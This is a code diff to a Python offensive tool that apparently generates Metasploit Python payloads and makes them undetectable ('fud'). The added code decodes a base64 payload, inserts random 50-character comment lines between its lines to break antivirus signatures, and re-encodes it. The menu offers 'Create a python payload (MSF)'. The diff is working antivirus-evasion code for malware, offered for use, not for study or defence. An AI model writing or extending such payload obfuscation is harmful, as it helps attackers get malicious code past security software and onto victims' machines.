@@ -6,7 +6,8 @@ import re
 import base64
 #custom import 
 import varsx 
-
+import random
+import string 
 
 banner= ('''@@@@@@   @@@  @@@   @@@@@@   @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@@  @@@   @@@@@@   @@@@@@@  
 @@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@  
@@ -105,7 +106,21 @@ def pythonpayloadfud():
     afb64 = "')[0]))"
     b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
     pycode = base64.b64decode(b64pycode)
-    
+    #print(pycode)
+    splpycode = pycode.decode().split("\n")
+    #print(splpycode)
+    pycodeembedlist = []
+    for z in splpycode:
+        pycodeembedlist.append(z)
+        pycodeembedlist.append("\n")
+        pycodeembedlist.append( '#' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)))
+        pycodeembedlist.append("\n")
+
+    finalcode = ''.join(pycodeembedlist)  
+    finalcodewoohoo  = base64.b64encode(finalcode.encode("utf-8"))
+    #print(finalcodewoohoo)
+    print(base64.b64decode(finalcodewoohoo).decode())
+
 
 def menu():
     prntopt("Create a python payload (MSF)")
